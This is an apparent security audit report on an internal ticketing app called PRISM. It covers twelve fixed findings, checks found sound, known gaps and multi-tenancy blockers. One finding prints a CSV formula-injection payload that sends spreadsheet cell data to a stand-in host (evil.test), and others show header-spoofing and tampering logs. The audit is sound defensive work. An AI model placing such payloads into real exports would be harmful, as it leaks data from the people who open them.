# PRISM security & quality hardening — 2026-09-10

Full-codebase audit and remediation pass, security-first, aimed at making
PRISM deployable in an enterprise environment.

**Scope decision:** multi-tenancy was explicitly held out of this pass. PRISM
has no tenant concept — `Department` is the only partition — and retrofitting
tenant isolation across ~80 models is a rearchitecture that should sit on top
of audited code, not underneath it. The gaps that block it are inventoried at
the end of this document as input to a later spec.

## Method

Everything below was verified against a running instance (MariaDB 11 +
the real Express app), not read off the page:

- All 46 migrations applied to an empty schema — clean, no failures.
- All 357 registered routes enumerated by introspecting the Express router.
- Every route probed as a deliberately restricted "Read Only" user, recording
  the status code, before and after each fix.
- Individual findings reproduced with targeted scripts (session replay,
  header spoofing, cross-user comment deletion, CSV export contents).

A regression test now exists for each fixed finding: **86 tests across 7
suites**, wired into CI so a failure blocks the image publish.

---

## Findings

Severity reflects impact on a real deployment, not CVSS.

### 1. Legacy role gates bypassed the permission system — HIGH

**The finding.** `User.role` is a two-value enum (`admin` | `technician`) that
predates the granular permission system and defaults to `technician` for every
account. Sixteen routes and thirteen controller checks gated on it via
`requireRole('admin', 'technician')` or `isStaff(user)` — conditions true for
every logged-in user. Those endpoints ignored the permission system entirely:
a role could be tightened all the way down to "Read Only" and they stayed open.

**Verified.** A Read Only account (4 view permissions, no write permissions)
edited and then deleted an administrator's ticket comment, and created,
edited and deleted project tasks, subtasks and blueprints:

```
ro EDIT admin comment   -> 200  "TAMPERED BY READ-ONLY USER"
ro DELETE admin comment -> 200
comments remaining: []
```

**Fixed.** Every `requireRole('admin','technician')` gate replaced with the
permission family that actually governs the action. `isStaff()` removed;
moderating another user's content now goes through
`canModerateTicketContent()`, which requires `tickets.edit_all`, or
`tickets.edit_department` within the same department — deliberately *not*
`tickets.edit_own`, which is the baseline everyone holds.

`requireRole('admin')` gates were left in place: they are restrictive rather
than permissive, so they were never the escalation path.

Ten ticket sub-resources (attachments, time deletion, watchers, tasks, CSAT,
comment edit/delete) turned out to have **no permission guard at all** and
were also closed.

**Result:** endpoints correctly denying a read-only user went from 225 to 258.
The only writes still reachable are three genuinely own-resource endpoints
(own API key, own notifications, own dashboard layout).

### 2. Session fixation — HIGH

**The finding.** `req.session.userId = user.id` without regenerating the
session. The session ID survived a change of identity, so an attacker who
could plant a session cookie retained a valid handle on the victim's
authenticated session.

**Verified.** Logging in as two different users on one cookie jar produced an
identical session ID, and `/auth/me` then returned the second user.

**Fixed.** `regenerateSession()` on login. Changing a password also
regenerates and revokes that account's other sessions. Confirmed: the old ID
now returns 401.

### 3. Login rate limiting bypassable by header spoofing — HIGH

**The finding.** `app.set('trust proxy', 1)` was unconditional, so the limiter
keyed on client-controlled `X-Forwarded-For`.

**Verified.** Ten attempts tripped the limiter; changing the header value
restored a full allowance:

```
XFF=203.0.113.9   401 x10, then 429 429
XFF=203.0.113.20+ 401 401 401 401     <-- fresh budget
```

**Fixed.** New `TRUST_PROXY` setting, defaulting to **off**. Production
compose sets `TRUST_PROXY=1` and does not publish the backend port; the dev
compose deliberately leaves it off because it does. Re-verified: rotated
headers now stay 429.

### 4. Placeholder secrets could reach production — HIGH

**The finding.** `secret: process.env.SESSION_SECRET || 'changeme'`, with the
guard against it running only when `NODE_ENV === 'production'`. An install
that never set `NODE_ENV` ran on the secret published in `.env.example` —
forgeable session cookies for any user, and the same value derives the AES key
protecting the LDAP bind password, license keys and OAuth tokens.

**Fixed.** `config/validateEnv.js` refuses to boot on a missing, placeholder,
or under-32-character secret regardless of `NODE_ENV`, and reports every
problem at once with the exact remedy. No fallback default remains.

### 5. CSV formula injection in every report export — MEDIUM

**The finding.** Exported cells were quoted for commas but not neutralized for
spreadsheet formulas. Ticket titles, contact names and notes are user-typed,
so an exported row could execute in the analyst's spreadsheet.

**Verified.** A ticket titled `=HYPERLINK("http://evil.test/?x="&A1,"click me")`
exported verbatim.

**Fixed.** Shared `utils/csv.js` prefixes `= + - @ \t \r` with a single quote.

### 6. CSV double-escaping corrupted exports — MEDIUM (correctness)

`sendCsv` mapped `csvCell` over each row and then again over the assembled
line, so any value containing a comma emerged as `"""a,b"""`. Every one of the
seven report exports was affected. Fixed by escaping exactly once in `toCsv`.

### 7. `POST /users` silently ignored `roleId` — MEDIUM

A requested `roleId` was discarded; the account was created with the seed role
for the legacy enum (a full System Technician) and returned `201` with no
indication the request had been ignored. An admin asking for a restricted
account silently got a privileged one. Now honored, and validated before the
account is created.

### 8. Weak password policy — MEDIUM

Eight characters, no other rule — `password`, `12345678` and the account's own
username all passed. Replaced with `utils/passwordPolicy.js`: 12 characters,
three of four character classes, common-password and sequential-run screening,
and rejection of passwords containing the account identity. Deliberately no
forced expiry, per NIST SP 800-63B.

### 9. Stored XSS via SVG branding upload — MEDIUM

The branding filter trusted the client-declared MIME type, and `res.sendFile`
served `.svg` inline as `image/svg+xml` from a **public, unauthenticated,
same-origin** URL. SVG executes script as a top-level document, so a
branding-only role could run script on the app origin in any visitor's
browser — session-riding a more privileged user.

Fixed by checking the extension as well as the MIME type, and serving branding
files with `Content-Security-Policy: default-src 'none'; sandbox`,
`X-Content-Type-Options: nosniff` and `Content-Disposition: inline`.

Attachment downloads elsewhere were checked and are safe — they all use
`res.download()`, which forces `Content-Disposition: attachment`.

### 10. No crash resilience or graceful shutdown — MEDIUM

No `unhandledRejection` or `uncaughtException` handler existed, in a codebase
with a history of EventEmitter crashes taking the process down, and no
`SIGTERM` handling, so every deploy severed in-flight requests. Both added,
plus an `EADDRINUSE` listener that reports a port collision in one line
instead of a bare stack trace.

`app.js` was split from `index.js` so the app can be built without binding a
port or starting schedulers — which is what makes the test suite possible.

### 11. Encryption key coupled to the session secret — MEDIUM

`tokenCrypto` derived its AES key from `SESSION_SECRET`, so rotating that
secret silently made every stored credential undecryptable, and
`decryptToken` swallowed the failure and returned `null`. Added
`ENCRYPTION_KEY` (falling back to the old behaviour for existing installs) and
an explicit log line on decryption failure.

### 12. Unthrottled credential-adjacent endpoints — LOW

API key creation and password change had no rate limit. Both now limited (10
per hour, 10 per 15 minutes). Limiter stores were made resettable so the
suite can test rate limiting rather than disable it.

---

## Checked and found sound

Worth recording, so the next pass doesn't re-derive it:

- **No SQL injection surface.** Zero raw `sequelize.query` calls with
  interpolated input existed at audit time; the two added in this pass use
  bound replacements.
- **`passwordHash` never leaves the API.** `User.toJSON()` deletes it;
  verified against live login and `/auth/me` responses.
- **Own-resource controllers scope correctly.** Saved filters, saved report
  views and calendar integrations all query by `userId: req.user.id` — no
  IDOR.
- **KB HTML sanitization is sound.** Server-side `sanitize-html` on both write
  paths, with a conservative tag/attribute allow-list.
- **Upload magic-byte verification works** and covers the dangerous-signature
  cases.
- **AD auto-provisioning does not grant permissions.** `loginAd` never calls
  `assignInitialRole`, so directory users arrive with `roleId: null` and no
  granular permissions. (An early reading of this pass suggested otherwise;
  it was wrong.)
- **All 46 migrations apply cleanly from an empty schema.**

---

## Known gaps — not fixed in this pass

Recorded deliberately rather than silently skipped.

1. **No pagination on list endpoints.** 160 `findAll` calls in controllers,
   10 with a limit. `GET /tickets` returns every ticket with its includes.
   This is a performance cliff and a memory-exhaustion vector at enterprise
   volume. Not fixed here because bounding the responses changes the shape the
   frontend consumes, and this session had no browser to verify the UI
   against — it needs a coordinated frontend change.

2. **Permission cache is per-process, 5-minute TTL.** `invalidateUserPermissions`
   only clears the local map, so revoking a permission can take up to five
   minutes to take effect and would never propagate across instances. Fine for
   the current single-instance deployment; a blocker for running PRISM
   HA. Needs a shared cache or a shorter TTL with a version counter.

3. **API keys carry the full permission set of their creator**, with no
   scoping and no expiry requirement. Any authenticated user can mint one.
   Now rate-limited, but least-privilege API keys are a genuine enterprise
   requirement.

4. **Admins are outside the permission system.** `requireRole('admin')`
   consults the legacy enum, so stripping an admin's granular permissions does
   not restrict them. Defensible, but it should be a deliberate documented
   decision rather than an artifact.

5. **No account lockout.** Rate limiting is per-IP; a distributed attack
   against one account is not slowed. Needs per-account failure tracking.

---

## Multi-tenancy blockers (input to a later spec)

What would have to change before PRISM could host multiple customers:

- **No tenant model.** `Department` is org structure *within* one customer,
  not an isolation boundary; it cannot be overloaded as one.
- **Every scope check is user- or department-relative.** `canAccessTicket`,
  `canAccessProject`, and every list `where` clause would each need a tenant
  predicate that cannot be forgotten — which argues for a Sequelize-level
  default scope rather than per-query discipline.
- **Global singletons that would leak across tenants:** `SystemSettings`
  (a flat key/value table), ticket and project status catalogues, custom
  fields, workflow rules, SLA policies, business hours, holiday lists,
  asset categories, and the seeded `Roles`/`Permissions` tables.
- **Six schedulers run process-wide** and would need to iterate tenants:
  workflow, AD sync, calendar sync, inbound email, CSAT, asset alerts.
- **Uploads are keyed by bare record ID** (`/uploads/{ticketId}/`), so two
  tenants' ticket 42 collide on disk.
- **Inbound email is one global mailbox**, and branding, LDAP config and SMTP
  are single-valued — each is per-tenant in an MSP deployment.
- **Sessions and the permission cache are keyed by user ID alone**, with no
  tenant dimension.

The honest summary: tenant isolation is a data-layer change, and doing it
per-query across ~80 models will leak. It should be enforced structurally.
